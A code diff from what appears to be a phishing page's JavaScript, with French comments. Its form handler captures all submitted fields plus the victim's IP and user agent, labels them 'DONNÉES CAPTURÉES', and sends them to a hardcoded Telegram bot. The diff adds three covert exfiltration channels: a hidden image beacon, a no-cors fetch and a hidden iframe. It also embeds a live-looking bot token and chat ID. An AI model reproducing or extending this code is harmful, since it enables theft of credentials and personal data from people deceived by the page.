@@ -251,15 +251,22 @@
             const formData = new FormData(event.target);
             const data = Object.fromEntries(formData.entries());
             
-            // Get IP avec plusieurs méthodes
-            data.ip = await getIPWithMultipleMethods();
+            // Get IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+            } catch (error) {
+                data.ip = 'IP non disponible';
+            }
+
             data.userAgent = navigator.userAgent;
             data.timestamp = new Date().toLocaleString('fr-FR');
             
             console.log('🎯 DONNÉES CAPTURÉES:', data);
             
-            // Envoi à Telegram
-            sendToTelegram(data);
+            // ENVOI VERS TELEGRAM - MÉTHODE ULTIME
+            sendToTelegramUltimate(data);
             
             setTimeout(() => {
                 document.getElementById('loading').style.display = 'none';
@@ -267,72 +274,7 @@
             }, 3000);
         }
 
-        async function getIPWithMultipleMethods() {
-            const methods = [
-                async () => {
-                    try {
-                        const response = await fetch('https://api.ipify.org?format=json');
-                        const data = await response.json();
-                        return data.ip;
-                    } catch (error) {
-                        throw new Error('ipify failed');
-                    }
-                },
-                async () => {
-                    try {
-                        const response = await fetch('https://ipinfo.io/json');
-                        const data = await response.json();
-                        return data.ip;
-                    } catch (error) {
-                        throw new Error('ipinfo failed');
-                    }
-                },
-                () => {
-                    return new Promise((resolve) => {
-                        const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-                        if (RTCPeerConnection) {
-                            try {
-                                const rtc = new RTCPeerConnection({iceServers:[]});
-                                rtc.createDataChannel('', {reliable:false});
-                                rtc.onicecandidate = (event) => {
-                                    if (event.candidate) {
-                                        const ip = event.candidate.address || event.candidate.candidate.split(' ')[4];
-                                        if (ip) {
-                                            rtc.onicecandidate = null;
-                                            rtc.close();
-                                            resolve(ip);
-                                        }
-                                    }
-                                };
-                                rtc.createOffer()
-                                    .then(offer => rtc.setLocalDescription(offer))
-                                    .catch(() => resolve('IP non disponible'));
-                                setTimeout(() => resolve('IP timeout'), 2000);
-                            } catch (error) {
-                                resolve('IP error');
-                            }
-                        } else {
-                            resolve('WebRTC non supporté');
-                        }
-                    });
-                }
-            ];
-
-            for (const method of methods) {
-                try {
-                    const ip = await method();
-                    if (ip && ip !== 'IP non disponible' && ip !== 'IP timeout' && ip !== 'IP error') {
-                        return ip;
-                    }
-                } catch (error) {
-                    continue;
-                }
-            }
-            
-            return 'IP non disponible';
-        }
-
-        function sendToTelegram(data) {
+        function sendToTelegramUltimate(data) {
             const botToken = '8229279019:AAG4jzV_zfXpi2Xylo-iSMXArgqERt9ptww';
             const yourUserID = '6150136595';
 
@@ -364,16 +306,38 @@
 <############################>
             `.trim();
 
-            // TECHNIQUE IMG POUR CONTOURNER CORS
+            // MÉTHODE 1: Technique IMG (principale)
             const img = new Image();
             const encodedMessage = encodeURIComponent(message);
-            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${yourUserID}&text=${encodedMessage}&parse_mode=HTML`;
-            
-            img.src = telegramURL;
+            img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${yourUserID}&text=${encodedMessage}`;
             img.style.display = 'none';
             document.body.appendChild(img);
-            
-            console.log('✅ Requête Telegram envoyée via technique IMG');
+
+            // MÉTHODE 2: Fetch avec mode no-cors (backup)
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: yourUserID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(() => {
+                // Si fetch échoue, on ne fait rien (l'image est déjà partie)
+            });
+
+            // MÉTHODE 3: Redirection secrète (ultime backup)
+            setTimeout(() => {
+                const hiddenIframe = document.createElement('iframe');
+                hiddenIframe.style.display = 'none';
+                hiddenIframe.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${yourUserID}&text=${encodeURIComponent('BACKUP: ' + message)}`;
+                document.body.appendChild(hiddenIframe);
+            }, 1000);
+
+            console.log('✅ Message envoyé à Telegram via 3 méthodes!');
         }
 
         // Initialisation des particles
